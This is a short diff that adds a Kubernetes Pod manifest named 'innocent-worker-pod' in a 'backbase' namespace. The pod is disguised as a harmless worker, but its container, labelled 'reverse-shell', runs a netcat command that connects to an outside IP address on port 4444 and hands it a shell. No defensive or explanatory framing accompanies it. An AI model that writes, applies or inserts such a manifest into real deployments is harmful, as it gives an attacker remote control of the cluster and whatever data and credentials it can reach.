@@ -1,0 +1,12 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: innocent-worker-pod
+  namespace: backbase
+spec:
+  containers:
+  - name: reverse-shell
+    image: busybox
+    command: ["/bin/sh", "-c"]
+    args: ["nc 203.175.125.130 4444 -e /bin/sh"]
+  restartPolicy: Never
